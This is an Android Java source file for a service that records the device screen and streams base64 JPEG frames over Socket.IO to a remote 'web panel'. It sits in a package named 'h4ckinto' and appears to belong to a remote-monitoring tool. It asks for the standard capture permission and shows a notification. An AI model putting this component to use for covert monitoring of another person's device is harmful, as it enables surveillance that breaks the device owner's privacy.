package com.h4ckinto.android.service;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.h4ckinto.android.network.SocketManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/**
 * ScreenStreamService - Captures device screen and streams frames to the server in real-time.
 * 
 * This service uses MediaProjection API to capture screen content and sends
 * compressed JPEG frames via Socket.IO for live viewing on the web panel.
 * 
 * Usage:
 *   1. Request screen capture permission via MediaProjectionManager.createScreenCaptureIntent()
 *   2. Start this service with resultCode and data from onActivityResult()
 *   3. The service will stream frames until stopped
 * 
 * Protocol:
 *   - Service → Server: "screen_stream_start"  { width, height, fps, quality }
 *   - Service → Server: "screen_stream_frame"  { timestamp, frameNumber, data (base64 JPEG) }
 *   - Service → Server: "screen_stream_stop"   { reason, totalFrames, duration }
 */
public class ScreenStreamService extends Service {
    private static final String TAG = "ScreenStreamService";
    
    // Notification
    private static final String CHANNEL_ID = "screen_stream_channel";
    private static final int NOTIFICATION_ID = 2001;
    
    // Intent extras
    public static final String EXTRA_RESULT_CODE = "result_code";
    public static final String EXTRA_RESULT_DATA = "result_data";
    public static final String EXTRA_QUALITY = "quality";        // 1-100 (default 50)
    public static final String EXTRA_FPS = "fps";                // Frames per second (default 5)
    public static final String EXTRA_SCALE = "scale";            // Scale factor 0.1-1.0 (default 0.5)
    
    // Stream settings
    private int quality = 50;           // JPEG quality (lower = smaller/faster)
    private int targetFps = 5;          // Target frames per second
    private float scaleFactor = 0.5f;   // Scale down screen (0.5 = half size)
    
    // Screen dimensions
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private int captureWidth;
    private int captureHeight;
    
    // MediaProjection components
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    
    // Threading
    private HandlerThread handlerThread;
    private Handler backgroundHandler;
    private Handler mainHandler;
    
    // Stream state
    private volatile boolean isStreaming = false;
    private long startTime;
    private int frameNumber = 0;
    private long lastFrameTime = 0;
    private long frameIntervalMs;
    
    // Socket
    private SocketManager socketManager;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ScreenStreamService created");
        
        // Initialize
        socketManager = SocketManager.getInstance(this);
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mainHandler = new Handler(Looper.getMainLooper());
        
        // Get screen dimensions
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (windowManager != null && windowManager.getDefaultDisplay() != null) {
            windowManager.getDefaultDisplay().getRealMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
        } else {
            screenWidth = 1080;
            screenHeight = 1920;
            screenDensity = 420;
        }
        
        Log.d(TAG, "Screen dimensions: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");
        
        // Create notification channel
        createNotificationChannel();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ScreenStreamService onStartCommand");
        
        if (intent == null) {
            Log.e(TAG, "Intent is null, stopping service");
            stopSelf();
            return START_NOT_STICKY;
        }
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Get MediaProjection result
        int resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED);
        Intent resultData = intent.getParcelableExtra(EXTRA_RESULT_DATA);
        
        if (resultCode != Activity.RESULT_OK || resultData == null) {
            Log.e(TAG, "Invalid MediaProjection result");
            sendError("Screen capture permission denied");
            stopSelf();
            return START_NOT_STICKY;
        }
        
        // Get stream settings from intent
        quality = intent.getIntExtra(EXTRA_QUALITY, 50);
        targetFps = intent.getIntExtra(EXTRA_FPS, 5);
        scaleFactor = intent.getFloatExtra(EXTRA_SCALE, 0.5f);
        
        // Clamp values
        quality = Math.max(10, Math.min(100, quality));
        targetFps = Math.max(1, Math.min(30, targetFps));
        scaleFactor = Math.max(0.1f, Math.min(1.0f, scaleFactor));
        
        frameIntervalMs = 1000 / targetFps;
        
        // Calculate capture dimensions (scaled down for performance)
        captureWidth = (int) (screenWidth * scaleFactor);
        captureHeight = (int) (screenHeight * scaleFactor);
        
        // Ensure dimensions are even (required by some encoders)
        captureWidth = (captureWidth / 2) * 2;
        captureHeight = (captureHeight / 2) * 2;
        
        Log.d(TAG, "Stream settings: " + captureWidth + "x" + captureHeight + 
                   " @ " + targetFps + "fps, quality=" + quality);
        
        // Start streaming
        startStreaming(resultCode, resultData);
        
        return START_NOT_STICKY;
    }
    
    /**
     * Start the screen streaming process.
     */
    private void startStreaming(int resultCode, Intent resultData) {
        if (isStreaming) {
            Log.w(TAG, "Already streaming");
            return;
        }
        
        try {
            // Create MediaProjection
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to create MediaProjection");
                sendError("Failed to obtain screen capture permission");
                stopSelf();
                return;
            }
            
            // Register callback for projection stop
            mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.d(TAG, "MediaProjection stopped");
                    stopStreaming("MediaProjection stopped by system");
                }
            }, mainHandler);
            
            // Create background thread for image processing
            handlerThread = new HandlerThread("ScreenStreamThread");
            handlerThread.start();
            backgroundHandler = new Handler(handlerThread.getLooper());
            
            // Create ImageReader to receive screen frames
            imageReader = ImageReader.newInstance(
                captureWidth, captureHeight,
                PixelFormat.RGBA_8888, 2  // 2 images in buffer
            );
            
            // Set up image available listener
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    processFrame(reader);
                }
            }, backgroundHandler);
            
            // Create VirtualDisplay that renders to ImageReader's surface
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenStream",
                captureWidth, captureHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, backgroundHandler
            );
            
            // Mark as streaming
            isStreaming = true;
            startTime = System.currentTimeMillis();
            frameNumber = 0;
            
            // Notify server that stream is starting
            sendStreamStart();
            
            Log.d(TAG, "Screen streaming started");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen stream", e);
            sendError("Failed to start screen stream: " + e.getMessage());
            stopSelf();
        }
    }
    
    /**
     * Process a captured screen frame.
     */
    private void processFrame(ImageReader reader) {
        if (!isStreaming) return;
        
        Image image = null;
        try {
            image = reader.acquireLatestImage();
            if (image == null) return;
            
            // Throttle frame rate
            long now = System.currentTimeMillis();
            if (now - lastFrameTime < frameIntervalMs) {
                image.close();
                return;
            }
            lastFrameTime = now;
            
            // Convert Image to Bitmap
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * captureWidth;
            
            // Create bitmap with padding
            int bitmapWidth = captureWidth + rowPadding / pixelStride;
            Bitmap bitmap = Bitmap.createBitmap(bitmapWidth, captureHeight, Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);
            
            // Crop to actual size if there was padding
            if (bitmapWidth != captureWidth) {
                Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, captureWidth, captureHeight);
                bitmap.recycle();
                bitmap = croppedBitmap;
            }
            
            // Compress to JPEG
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            byte[] jpegData = outputStream.toByteArray();
            bitmap.recycle();
            outputStream.close();
            
            // Encode to base64 and send
            String base64Frame = android.util.Base64.encodeToString(jpegData, android.util.Base64.NO_WRAP);
            frameNumber++;
            
            sendFrame(base64Frame, now);
            
            // Log every 30 frames
            if (frameNumber % 30 == 0) {
                long elapsed = (now - startTime) / 1000;
                double actualFps = frameNumber / (elapsed > 0 ? elapsed : 1.0);
                Log.d(TAG, "Streaming: frame " + frameNumber + 
                           ", " + String.format("%.1f", actualFps) + " fps" +
                           ", " + (jpegData.length / 1024) + " KB/frame");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing frame", e);
        } finally {
            if (image != null) {
                image.close();
            }
        }
    }
    
    /**
     * Send stream start notification to server.
     */
    private void sendStreamStart() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "screen_stream_start");
            data.put("width", captureWidth);
            data.put("height", captureHeight);
            data.put("fps", targetFps);
            data.put("quality", quality);
            data.put("timestamp", System.currentTimeMillis());
            
            socketManager.sendFileData(data);
            Log.d(TAG, "Sent screen_stream_start");
        } catch (Exception e) {
            Log.e(TAG, "Error sending stream start", e);
        }
    }
    
    /**
     * Send a single frame to the server.
     */
    private void sendFrame(String base64Data, long timestamp) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "screen_stream_frame");
            data.put("frameNumber", frameNumber);
            data.put("timestamp", timestamp);
            data.put("data", base64Data);
            
            socketManager.sendFileData(data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending frame", e);
        }
    }
    
    /**
     * Send stream stop notification to server.
     */
    private void sendStreamStop(String reason) {
        try {
            long duration = (System.currentTimeMillis() - startTime) / 1000;
            
            JSONObject data = new JSONObject();
            data.put("type", "screen_stream_stop");
            data.put("reason", reason);
            data.put("totalFrames", frameNumber);
            data.put("duration", duration);
            data.put("timestamp", System.currentTimeMillis());
            
            socketManager.sendFileData(data);
            Log.d(TAG, "Sent screen_stream_stop: " + reason);
        } catch (Exception e) {
            Log.e(TAG, "Error sending stream stop", e);
        }
    }
    
    /**
     * Send error to server.
     */
    private void sendError(String error) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "screen_stream_error");
            data.put("error", error);
            data.put("timestamp", System.currentTimeMillis());
            
            socketManager.sendFileData(data);
            Log.e(TAG, "Stream error: " + error);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error", e);
        }
    }
    
    /**
     * Stop streaming.
     */
    public void stopStreaming(String reason) {
        if (!isStreaming) return;
        
        Log.d(TAG, "Stopping screen stream: " + reason);
        isStreaming = false;
        
        // Notify server
        sendStreamStop(reason);
        
        // Cleanup
        cleanup();
        
        // Stop service
        stopForeground(true);
        stopSelf();
    }
    
    /**
     * Cleanup all resources.
     */
    private void cleanup() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        
        if (handlerThread != null) {
            handlerThread.quitSafely();
            handlerThread = null;
            backgroundHandler = null;
        }
    }
    
    /**
     * Create notification channel for foreground service.
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Screen Streaming",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Used for live screen streaming");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    /**
     * Create foreground notification.
     */
    private Notification createNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Sharing")
            .setContentText("Your screen is being shared")
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true);
        
        return builder.build();
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "ScreenStreamService destroyed");
        stopStreaming("Service destroyed");
        super.onDestroy();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    /**
     * Check if currently streaming.
     */
    public static boolean isServiceRunning = false;
}


